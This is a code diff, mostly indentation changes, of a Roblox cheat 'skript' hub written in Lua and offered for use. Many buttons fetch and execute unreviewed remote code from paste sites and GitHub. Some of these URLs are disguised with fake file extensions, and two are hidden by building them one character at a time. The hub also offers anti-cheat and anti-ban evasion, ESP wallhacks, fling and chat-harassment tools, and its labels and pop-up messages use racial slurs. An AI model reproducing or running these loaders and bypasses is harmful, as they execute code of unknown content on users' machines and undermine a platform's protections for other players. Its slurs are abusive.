@@ -80,26 +80,26 @@ getgenv().espstuff =Color3.fromRGB(255,255,255)
 
 function enablestuff()
 for i,v in pairs(Players:GetPlayers()) do
-    if v~= plr and v.Character then
-        if not v.Character:FindFirstChild('ESP') then
-            local highlight = Instance.new('Highlight')
-            highlight.Name = 'ESP'
-            highlight.Parent = v.Character
-            highlight.Enabled = getgenv().Enabled
-            highlight.FillColor = getgenv().espstuff
-            highlight.OutlineColor = getgenv().espstuff
-        else
-            local highlight = v.Character:FindFirstChild('ESP')
-            highlight.Enabled = getgenv().Enabled
-            highlight.FillColor = getgenv().espstuff
-            highlight.OutlineColor = getgenv().espstuff
-        end
+if v~= plr and v.Character then
+    if not v.Character:FindFirstChild('ESP') then
+        local highlight = Instance.new('Highlight')
+        highlight.Name = 'ESP'
+        highlight.Parent = v.Character
+        highlight.Enabled = getgenv().Enabled
+        highlight.FillColor = getgenv().espstuff
+        highlight.OutlineColor = getgenv().espstuff
+    else
+        local highlight = v.Character:FindFirstChild('ESP')
+        highlight.Enabled = getgenv().Enabled
+        highlight.FillColor = getgenv().espstuff
+        highlight.OutlineColor = getgenv().espstuff
     end
-  end
+end
+end
 end
 
 RunService.RenderStepped:connect(function()
-  enablestuff()
+enablestuff()
 end)
 
 SkriptsSection:NewDropdown("(NEW)🏪WALMART DISKOVERED (LIMITED ITEM)", "updates and add-ons to the skript will be here", {"Version: 8.8", "updates:", "🚨EXEKUTE ANTI-BYFRON IF BYFRON SHOWS🚨", "🏪WALMART DISKOVERED (LIMITED ITEM)", "🍕 Pizzaria Tykoon LIMITED UGX", "🥤BLUE BUBBLE TEA(INSTANT ITEM)", "🧟‍♀️ZOMBIE DEFENSE (free sword item)", "🫂karry a friend 3 ugx", "🩸🔪 GRIEFVILLE x cHUcKY:\nNightmare(FREEUGX)", "🐟 Blippi's Playground 🐟", "🧥MAX MARA KOATS ADVENTURE\n(INSTANT UGX,2ND DROP)", "🥤BUBBLE-TEA TYKOON (INSTANT UGX)", "🎈[World of Optiks] LensKrafters Eye Odyssey", "😸👋🏽 MY HELLO KITTY KAFE", "[❄️NEW! SNOW PARTY❄️] JBL LAND", "🎥 🏃🏽‍♂️💨Kameraman Race Simulator 🎥🏃🏽‍♂️💨", "JUMP FOR UGX", "❇️ 🎉 Gummy Bear Party! 🎉 ❇️", "(NEW) 💦SONGKRAN EVENT 4 FREE UGX🎉", "👓Xhill Obby🥶 INSTANT FREE UGX", "JBL LAND 🧥 (INSTANT UGX)", "(NEW) evade hub(dot.hub) by CF Trail (OP)", "(NEW games)tongue battles👅, pirate tykoon🏴‍☠️", "🦄 Singapore Wanderland 🦄", "[NEW!] FREE UGX SPINNER☸️", "[UGX] 🤓Math Answer or Die", "💪🏽Bulked Up (FREE UGX)💪🏽", "🌌Sol's RNG🌌 (UGX)", "🤺[RELEASE]Bladers: Rebirth🤺 (UGX)", "(NEW) 🌟ULTIMATE EASY OBBY\n2nd drop(Games)", "(NEW) 📸The Maze skript",  "FREE UGX for GRIEFVILLE🩸🔪", "prinxe of egypt 🇪🇬FREE UGX", "🥋karate fight sim FREE UGX", "-added 🌿cHANGIVERSE(9 FREE UGX)", "-added AVNU💃🏽🕺🏾 FREE UGX", "MULTIPLE INSTANT FREE UGc for Lunxhable Playables🥪\n(Games)", "- 2 FREE ugc skript[Last to Leave]\n(Games)", "-added ⭐️FREE Ugx SKRIPTS(Games)", "-added anti-xheat bypass", "-added highlight players ESP\nHighlight kolor pixker", "xhelulu,HG💚🍭🍜"}, function(currentOption)
@@ -107,7 +107,7 @@ print(currentOption)
 end)
 
 SkriptsSection:NewButton("USE if toggle doesnt load The game ur in prolly\nwont load it", "toggle", function()
-    -- [ TOGGLE klose/open ] --
+-- [ TOGGLE klose/open ] --
 loadstring(game:HttpGet("https://pastecode.dev/raw/9um0ynui/toggle_lulaslollipop.png", true))()
 end)
 SkriptsSection:NewButton("(ANTI-BYFRON)\n🚨MUST USE AFTER SKRIPT LOADS🚨", "anti byfron kause they tryna troll us lmao", function()
@@ -115,7 +115,7 @@ loadstring(game:HttpGet("https://pastecode.dev/raw/gr7xm8i3/LollypopAdmin-fuxkby
 end)
 
 SkriptsSection:NewButton("🍭 Admin (;cmds)", "type the kommand in the kommand bar", function()
-  --lollypopadmin,fukbyfron&NAdevs
+--lollypopadmin,fukbyfron&NAdevs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/LollypopAdmin-skiddedbylulas/main/nobyfron.main",true))()
 end)
 
@@ -134,11 +134,11 @@ SkriptsSection:NewLabel("This Nigga Is Using: " .. identifyexecutor())
 --[ ALL SKRIPTS ]--
 local SkriptsSection = Skripts:NewSection("Skripts:")
 SkriptsSection:NewToggle("Highlight Players", "esp players", function(state)
-    getgenv().Enabled = state
+getgenv().Enabled = state
 end)
 
 SkriptsSection:NewColorPicker("Highlight Kolor", "use rainbow and stop the dot on ur kolor if mobile", Color3.fromRGB(255,255,255), function(color)
-  getgenv().espstuff = color
+getgenv().espstuff = color
 end)
 
 SkriptsSection:NewToggle("HiddenFling", "fling", function(x)
@@ -152,7 +152,7 @@ end)
 
 -- SKRIPTS BUTTONS
 SkriptsSection:NewButton("ANTI-BAN (fixed &working✅)", "anti-ban skript/antilogger", function()
-    --just anti logger (safexhat)
+--just anti logger (safexhat)
 loadstring(game:HttpGet("https://pastecode.dev/raw/tarixx9o/lulas-antiban.jar",true))()
 end)
 
@@ -168,16 +168,16 @@ end)
 -- end)
 SkriptsSection:NewButton("Anti-Xheat bypass\nUse: bypass any klient fly/fling detektion", "allows u to hide stuff on your klient", function()
 loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
-    wait()
-    --allows u to hide stuff on your klient
-    --kommon use: bypass any klient anti-xheat fly/fling detektion (hides bodymovers)
+wait()
+--allows u to hide stuff on your klient
+--kommon use: bypass any klient anti-xheat fly/fling detektion (hides bodymovers)
 loadstring(game:HttpGet("https://pastecode.dev/raw/0jvzh3eh/antiInstanxe-antixheatbypass_lulaslollipop.zip",true))()
 end)
 
 SkriptsSection:NewButton("Anti-Bang", "this will send u to void if they bang u", function()
-    -- anti bang exekuted
+-- anti bang exekuted
 loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))() 
-    -- this will tp u to the void killing people who use bang on u if they dont use workspace.FallenPartsDestroyHeight = 0/0 to bypass void limit
+-- this will tp u to the void killing people who use bang on u if they dont use workspace.FallenPartsDestroyHeight = 0/0 to bypass void limit
 loadstring(game:HttpGet("https://pastecode.dev/raw/wz0rgb10/antibang_lulaslollipop.mp3",true))()--antibang
 end)
 
@@ -185,47 +185,47 @@ SkriptsSection:NewButton("Anti-Fall (universal)", "it will tp u to the previous 
 function()
 -- anti fall
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/AntiFall/main/Script"))()
-    wait(0.01)
+wait(0.01)
 loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
 end)
 
 SkriptsSection:NewButton("ANTI-AFK", "no afk",
 function()local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
-   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-   wait(1)
-   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+wait(1)
+vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
 end)
 --end anti afk 
-    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
 Library.DefaultColor = Color3.fromRGB(50,205,50)
 
 Library:Notification({
-    Text = "now they kant stop u frm sleeping😴",
-    Duration = 5.5
+Text = "now they kant stop u frm sleeping😴",
+Duration = 5.5
 })
 end)
 
 SkriptsSection:NewButton("ANTI-AFK 2", "selfe",
 function()
-  --anti afk
-  for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
-  v:Disable()
-  end
+--anti afk
+for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
+v:Disable()
+end
 
-  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-  Library.DefaultColor = Color3.fromRGB(50,205,50)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+Library.DefaultColor = Color3.fromRGB(50,205,50)
 
-  Library:Notification({
-      Text = "anti afk enabled🍭",
-      Duration = 5
-  })
+Library:Notification({
+  Text = "anti afk enabled🍭",
+  Duration = 5
+})
 end)
 
 -- toggle anti sit
 SkriptsSection:NewToggle("Anti-Sit", "kinda good but i prefer using godmode", function(state)
 if state then
-  local RunService = game:GetService("RunService")
+local RunService = game:GetService("RunService")
 function antiSit()
 if game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then 
 game.Players.LocalPlayer.Character.Humanoid.Sit = false
@@ -240,7 +240,7 @@ Text = "on",
 Duration = 3
 })
 else
-  local RunService = game:GetService("RunService")
+local RunService = game:GetService("RunService")
 function antiSit()
 if game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then 
 game.Players.LocalPlayer.Character.Humanoid.Sit = true
@@ -264,19 +264,19 @@ end)
 --infjump.Konnekt
 SkriptsSection:NewToggle("Infinite jump", "no jump limit", function(toggled)
 if toggled then
-    getgenv().InfJump = true
-    spawn(function()
-        while getgenv().InfJump == true do
-            game:GetService("UserInputService").JumpRequest:connect(function()
-                if getgenv().InfJump == true then
-                    game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-                end
-            end)
-            wait()
-        end
-    end)
+getgenv().InfJump = true
+spawn(function()
+    while getgenv().InfJump == true do
+        game:GetService("UserInputService").JumpRequest:connect(function()
+            if getgenv().InfJump == true then
+                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+            end
+        end)
+        wait()
+    end
+end)
 else
-    getgenv().InfJump = false
+getgenv().InfJump = false
 end
 end)
 --infjump.Diskonnekt
@@ -315,21 +315,21 @@ end)
 
 -- superhuman
 SkriptsSection:NewToggle("Super-Human", "boosts jumppower and speed", function(state)
-    if state then
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
-    else
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
-    end
+if state then
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
+else
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+end
 end)
 
 SkriptsSection:NewToggle("Sit", "sit/unsit", function(state)
 if state then
-    -- sitTrue
+-- sitTrue
 game.Players.LocalPlayer.Character.Humanoid.Sit = true
 else
-    -- sitFalse
+-- sitFalse
 game.Players.LocalPlayer.Character.Humanoid.Sit = false
 end
 end)
@@ -365,10 +365,10 @@ end)
 SkriptsSection:NewButton("less lag", "FX remover", function()
 for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
 if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
-    v.Material = Enum.Material.SmoothPlastic
-    if v:IsA("Texture") then
-        v:Destroy()
-    end
+v.Material = Enum.Material.SmoothPlastic
+if v:IsA("Texture") then
+    v:Destroy()
+end
 end
 end	
 
@@ -403,7 +403,7 @@ end)
 SkriptsSection:NewButton("walk on walls (R15 and R6)", "w.o.w", function()
 -- walk on walls
 loadstring(game:HttpGetAsync("https://pastebin.com/raw/RY9cBbdG"))()
-  loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
 end)
 SkriptsSection:NewLabel("Mobile Fly guis")
 SkriptsSection:NewButton("Fly GUI V2", "mobile fly gui",
@@ -416,7 +416,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/mobileflygui/ma
 end)
 SkriptsSection:NewButton("Mobile Fly GUI B&W", "modded",
 function()--b&w fly gui mobile
-  loadstring(game:HttpGet("https://pastecode.dev/raw/hARYYPVGuq/moddedflygui_lulaslollipop",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/hARYYPVGuq/moddedflygui_lulaslollipop",true))()
 end)
 SkriptsSection:NewButton("Mobile FLY HD ADMIN", "mobile fly HD ADMIN version",
 function()-- FLY HD ADMIN
@@ -498,7 +498,7 @@ end)
 SkriptsSection:NewButton("MOUSE KURSOR", "gives u a mouse kursor touxh",
 function()
 loadstring(game:HttpGet(('https://pastefy.app/58d8d52G/raw'),true))()
-  loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
 end)
 
 SkriptsSection:NewLabel("2016-17 roblox")
@@ -527,12 +527,12 @@ SkriptsSection:NewButton("RAINBOW MAP", " ",
 function()--RAINBOW MAP 
 while true do
 for _, part in ipairs(workspace:GetDescendants()) do
-    if part:IsA("BasePart") then
-        local r = math.random()
-        local g = math.random()
-        local b = math.random()
-        part.BrickColor = BrickColor.new(Color3.new(r, g, b))
-    end
+if part:IsA("BasePart") then
+    local r = math.random()
+    local g = math.random()
+    local b = math.random()
+    part.BrickColor = BrickColor.new(Color3.new(r, g, b))
+end
 end
 wait(0.5)
 end
@@ -566,9 +566,9 @@ local oldNewindex
 
 oldNewindex = hookmetamethod(game, "__newindex", function(object, propertyName, propertyValue)
 if object == camera and propertyName == "CFrame" then
-    if settings["Aspect Ratio"] then
-        propertyValue = propertyValue * CFrame.new(0, 0, 0, 1, 0, 0, 0, settings["Ratio Value"], 0, 0, 0, 1)
-    end
+if settings["Aspect Ratio"] then
+    propertyValue = propertyValue * CFrame.new(0, 0, 0, 1, 0, 0, 0, settings["Ratio Value"], 0, 0, 0, 1)
+end
 end
 return oldNewindex(object, propertyName, propertyValue)
 end)
@@ -643,7 +643,7 @@ function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/
 end)
 SkriptsSection:NewButton("Fluxus Koral remake", "kredits Anya&me",
 function()
-  --fluxus remake(kredits to Anya&🍭)
+--fluxus remake(kredits to Anya&🍭)
 loadstring(game:HttpGet("https://pastecode.dev/raw/DhToGLHKE9/fluxusExekutor_lulaslollipopAnya",true))()
 end)
 SkriptsSection:NewButton("KRNL Exekutor", "an exekutor",
@@ -668,7 +668,7 @@ end)
 SkriptsSection:NewButton("Rx7 exekutor gui 2 new version", "rc7",
 function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SyrixHax/RC7/Version/Rbx"))()
-  -- rx7 exekutor gui 2 new version
+-- rx7 exekutor gui 2 new version
 end)
 SkriptsSection:NewButton("Synapse X (old gui)", "synapse x",
 function()loadstring(game:HttpGet("https://pastebin.com/raw/1fAnGAA0"))()
@@ -681,7 +681,7 @@ end)
 SkriptsSection:NewButton("Synapse X Rework", "exe gui",
 function()
 loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))()
-  -- Synapse x rework
+-- Synapse x rework
 end)
 SkriptsSection:NewButton("Nokom exe", "shadow x gui",
 function()loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/NoCom-Executor/main/NoCom"))()
@@ -743,7 +743,7 @@ Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
 Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
 Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
 game.Players.LocalPlayer.Character.Humanoid.Jump = false
- end
+end
 end
 end)
 
@@ -762,7 +762,7 @@ Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
 Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
 Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
 game.Players.LocalPlayer.Character.Humanoid.Jump = false
- end
+end
 end
 end)
 
@@ -1121,7 +1121,7 @@ local AdminSection = Admin:NewSection("Admin Kommands")
 --end)
 
 AdminSection:NewButton("Infinite Yield (kustom)", "edited by me with added kommands", function()
-  --Infiniteyield main
+--Infiniteyield main
 loadstring(game:HttpGet("https://pastecode.dev/raw/vls9b2lm/infiniteyield-EdgeIY",true))()
 end)
 AdminSection:NewButton("Fates Admin", "default prefix :", function()
@@ -1157,16 +1157,16 @@ hextux admin 1.0.2
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BonBonTheDev/Hextus/main/Hextus.lua",true))()
 end)
 AdminSection:NewButton("Vortex Admin", "admin", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Fe-Vortex-admin-V2/main/VortexCompany/C4/Discord.lua"))() 
-  -- fe vortex admin
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Fe-Vortex-admin-V2/main/VortexCompany/C4/Discord.lua"))() 
+-- fe vortex admin
 end)
 AdminSection:NewButton("Gx Admin", "gx admin", function()
-  loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK",true))();
-  -- Gx admin
+loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK",true))();
+-- Gx admin
 end)
 AdminSection:NewButton("Homebrew Admin", "admin", function()
-  loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-or-FE-Homebrew-Admin-3106"))()
-  -- Homebrew admin
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-or-FE-Homebrew-Admin-3106"))()
+-- Homebrew admin
 end)
 AdminSection:NewButton("Property Admin", "property", function()
 --[[
@@ -1238,11 +1238,11 @@ loadstring(game:HttpGet("https://pastecode.dev/raw/w5QIzqKn/kraxkhead_lulaslolli
 end)
 
 FunSection:NewButton("Jump to flip", "keybind Jump", function()
-  loadstring(game:HttpGet("https://pastecode.dev/raw/7nZso3Lj/jumpToFlip_lulaslollipop",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/7nZso3Lj/jumpToFlip_lulaslollipop",true))()
 end)
 
 FunSection:NewButton("XD", "XDDDDDDD", function()
-  loadstring(game:HttpGet("https://pastecode.dev/raw/ch9MnV0j/wiiRemote_lulaslollipop",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/ch9MnV0j/wiiRemote_lulaslollipop",true))()
 end)
 
 local FunSection = Fun:NewSection("Message Fun")
@@ -1269,31 +1269,31 @@ end)
 --[bypasses]--
 FunSection:NewLabel("Bypasses (no ban)")
 FunSection:NewButton("Explikit Bypasser🔞(100% safe)", "has an antilogger so u will not be banned", function()
-  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-  Library.DefaultColor = Color3.fromRGB(50,205,50)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+Library.DefaultColor = Color3.fromRGB(50,205,50)
 
-  Library:Notification({
-  Text = "Loading Explikit Bypasser...",
-  Duration = 3.2
-  })
+Library:Notification({
+Text = "Loading Explikit Bypasser...",
+Duration = 3.2
+})
 
-  --explikitbypasser🔞+
-  loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'a'..'B'..'i'..'X'..'w'..'6'..'R'..'C'..'/'..'r'..'a'..'w'), true))()
+--explikitbypasser🔞+
+loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'a'..'B'..'i'..'X'..'w'..'6'..'R'..'C'..'/'..'r'..'a'..'w'), true))()
 
-  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-  Library.DefaultColor = Color3.fromRGB(50,205,50)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+Library.DefaultColor = Color3.fromRGB(50,205,50)
 
-  Library:Notification({
-  Text = "loaded! have fun nigger",
-  Duration = 3
-  })--hookinside
+Library:Notification({
+Text = "loaded! have fun nigger",
+Duration = 3
+})--hookinside
 end)
 FunSection:NewButton("NGA Bypasser(100% safe)", "has an antilogger so u will not be banned", function()--ngabypasser
 loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'J'..'h'..'8'..'r'..'s'..'l'..'a'..'5'..'/'..'r'..'a'..'w'), true))()
 end)
 
 FunSection:NewButton("V3rge Bypasser(100% safe)", "kredits to owner", function()
- --v3rge
+--v3rge
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/bypass/main/OrionHub.dev"))()
 end)
 
@@ -1339,7 +1339,7 @@ local player = tostring(data.FromSpeaker)
 if player == lp then return end
 local message = tostring(data.Message)
 if (message):len() <= (ChatLegth-7) then
-    SayMessageRequest:FireServer(('\%s'):format(message,""),tostring(data.OriginalChannel))
+SayMessageRequest:FireServer(('\%s'):format(message,""),tostring(data.OriginalChannel))
 end
 end)
 end)
@@ -1360,7 +1360,7 @@ local player = tostring(data.FromSpeaker)
 if player == lp then return end
 local message = tostring(data.Message)
 if (message):len() <= (ChatLegth-7) then
-    SayMessageRequest:FireServer(('\"%s\"%s'):format(message,"🤓"),tostring(data.OriginalChannel))
+SayMessageRequest:FireServer(('\"%s\"%s'):format(message,"🤓"),tostring(data.OriginalChannel))
 end
 end)
 end)
@@ -1376,53 +1376,53 @@ coroutine.wrap(function()
 
 while wait() do
 
-    for i = 0,255,10 do
+for i = 0,255,10 do
 
-        textcolour = Color3.new(255/255,i/255,0/255)
+    textcolour = Color3.new(255/255,i/255,0/255)
 
-        wait()
+    wait()
 
-    end
+end
 
-    for i = 255,0,-10 do
+for i = 255,0,-10 do
 
-        textcolour = Color3.new(i/255,255/255,0/255)
+    textcolour = Color3.new(i/255,255/255,0/255)
 
-        wait()
+    wait()
 
-    end
+end
 
-    for i = 0,255,10 do
+for i = 0,255,10 do
 
-        textcolour = Color3.new(0/255,255/255,i/255)
+    textcolour = Color3.new(0/255,255/255,i/255)
 
-        wait()
+    wait()
 
-    end
+end
 
-    for i = 255,0,-10 do
+for i = 255,0,-10 do
 
-        textcolour = Color3.new(0/255,i/255,255/255)
+    textcolour = Color3.new(0/255,i/255,255/255)
 
-        wait()
+    wait()
 
-    end
+end
 
-    for i = 0,255,10 do
+for i = 0,255,10 do
 
-        textcolour = Color3.new(i/255,0/255,255/255)
+    textcolour = Color3.new(i/255,0/255,255/255)
 
-        wait()
+    wait()
 
-    end
+end
 
-    for i = 255,0,-10 do
+for i = 255,0,-10 do
 
-        textcolour = Color3.new(255/255,0/255,i/255)
+    textcolour = Color3.new(255/255,0/255,i/255)
 
-        wait()
+    wait()
 
-    end
+end
 
 end
 
@@ -1436,63 +1436,63 @@ while wait() do
 
 pcall(function()
 
-  game:GetService("Chat"):SetBubbleChatSettings({
+game:GetService("Chat"):SetBubbleChatSettings({
 
-        TextColor3 = textcolour,
+    TextColor3 = textcolour,
 
-        -- The amount of time, in seconds, to wait before a bubble fades out.
+    -- The amount of time, in seconds, to wait before a bubble fades out.
 
-        BubbleDuration = 20,
+    BubbleDuration = 20,
 
-        -- The amount of messages to be displayed, before old ones disappear
+    -- The amount of messages to be displayed, before old ones disappear
 
-        -- immediately when a new message comes in.
+    -- immediately when a new message comes in.
 
-        MaxBubbles = 20,
+    MaxBubbles = 20,
 
-        -- Styling for the bubbles. These settings will change various visual aspects.
+    -- Styling for the bubbles. These settings will change various visual aspects.
 
-        BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
 
-        TextSize = 16,
+    TextSize = 16,
 
-        Font = Enum.Font.Ubuntu, --Enum.Font.GothamSemibold
+    Font = Enum.Font.Ubuntu, --Enum.Font.GothamSemibold
 
-        Transparency = .1,
+    Transparency = .1,
 
-        CornerRadius = UDim.new(0, 30),
+    CornerRadius = UDim.new(0, 30),
 
-        TailVisible = true,
+    TailVisible = true,
 
-        Padding = 8, -- in pixels
+    Padding = 8, -- in pixels
 
-        MaxWidth = 500, --in pixels
+    MaxWidth = 500, --in pixels
 
-        -- Extra space between the head and the billboard (useful if you want to
+    -- Extra space between the head and the billboard (useful if you want to
 
-        -- leave some space for other character billboard UIs)
+    -- leave some space for other character billboard UIs)
 
-        VerticalStudsOffset = 0,
-
-
-
-        -- Space in pixels between two bubbles
-
-        BubblesSpacing = 3,
+    VerticalStudsOffset = 0,
 
 
 
-        -- The distance (from the camera) that bubbles turn into a single bubble
+    -- Space in pixels between two bubbles
 
-        -- with ellipses (...) to indicate chatter.
+    BubblesSpacing = 3,
 
-        MinimizeDistance = 250,
 
-        -- The max distance (from the camera) that bubbles are shown at
 
-        MaxDistance = 2222,
+    -- The distance (from the camera) that bubbles turn into a single bubble
 
-    })
+    -- with ellipses (...) to indicate chatter.
+
+    MinimizeDistance = 250,
+
+    -- The max distance (from the camera) that bubbles are shown at
+
+    MaxDistance = 2222,
+
+})
 
 end)
 
@@ -1508,8 +1508,8 @@ local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/blood
 Library.DefaultColor = Color3.fromRGB(50,205,50)
 
 Library:Notification({
-  Text = ">lyrics SongName by AristName (doesnt work for urself)",
-  Duration = 7
+Text = ">lyrics SongName by AristName (doesnt work for urself)",
+Duration = 7
 })
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/lyricsBot/main/singer.lua"))()
@@ -1531,7 +1531,7 @@ local Tools = Window:NewTab("Tools")
 local ToolsSection = Tools:NewSection("Tools")
 
 ToolsSection:NewButton("BTools", "building tools", function()
-    --flingtools
+--flingtools
 loadstring(game:HttpGet("https://pastecode.dev/raw/na22lddw/flingtool-ghost_lulaslollipop",true))()
 end)
 
@@ -1551,14 +1551,14 @@ b.BinType = 3
 end)--end.kopytool
 --end btools.Tools tab
 ToolsSection:NewButton("Flashlight🔦(good for horror or dark games)", "use this is dark horror games(rekommend)", function()
-    --flashlight/FE torxh
+--flashlight/FE torxh
 loadstring(game:HttpGet("https://pastecode.dev/raw/7o10k3hq/flashlightLS_lulaslollipop",true))()
 end)
 ToolsSection:NewButton("Free Gear Tools 🧨", "💣⚙️👊🏽⛓️fun", function()
 loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
 end)
 ToolsSection:NewButton("Klone Tool (not fe)", "lego", function()
-    --klonez
+--klonez
 loadstring(game:HttpGet("https://pastecode.dev/raw/m4u6g9j1/klonesnotfe",true))()
 end)
 ToolsSection:NewButton("F3X", "f3x building",
@@ -1652,7 +1652,7 @@ loadstring(game:HttpGet("https://pastecode.dev/raw/oas3bnqw/24kGoldn-findMiks_lu
 end)
 
 HubSection:NewButton("Roblox Innovation Rewards\n(kollekt badges/items)", "autokollekt badges/kubes", function()
-        --voting hub skript       
+    --voting hub skript       
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/innovationawards/main/autokollekt/votinghub_lulaslollipop",true))()
 end)
 
@@ -1669,17 +1669,17 @@ loadstring(game:HttpGet("https://pastecode.dev/raw/09oan2u9/fuxkinFatesESP.KREDt
 end);
 
 HubSection:NewButton("k00pkid gui (Reupload)", "k000000000pppppppp", function()
-        --k00p revival skript       
+    --k00p revival skript       
 loadstring(game:HttpGet("https://pastecode.dev/raw/tb4x2127/k00pkidRevival_lulaslollipop.mp3",true))()
 end)
 
 HubSection:NewButton("funeral home gui(works in old games \n W less players)", "kixk gui", function()
-  --funeralhomekixkgui
+--funeralhomekixkgui
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/FHOMEkik/main/funeralhome_lulaslollipop",true))()
 end)
 
 HubSection:NewButton("Tp To Player GUI (small)", "small like zuki", function()
-  --tpgui
+--tpgui
 loadstring(game:HttpGet("https://pastebin.com/raw/kfwV9ciu",true))()
 end)
 
@@ -1689,7 +1689,7 @@ end)
 
 HubSection:NewButton("ANTI AFK gui (auto enabled anti-afk)", "no afk",
 function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/juywvm/-Roblox-Projects-/main/____Anti_Afk_Remastered_______"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/juywvm/-Roblox-Projects-/main/____Anti_Afk_Remastered_______"))();
 end)
 
 HubSection:NewButton("Universal OP Shiftloxk gui", "shiftloxk ", function()
@@ -1977,8 +1977,8 @@ HubSection:NewButton("Haxker_666 v2.9 (new update)", "o:", function()
 --[[
 Haxker_666 hub fixed
 ]]
-  loadstring(game:HttpGet('https://raw.githubusercontent.com/FreeRobloxScripts1/Haxker_6666666-Hub/main/Script-Hub/Version-2.9'))()
-  -- Haxker_666 2.9 new update
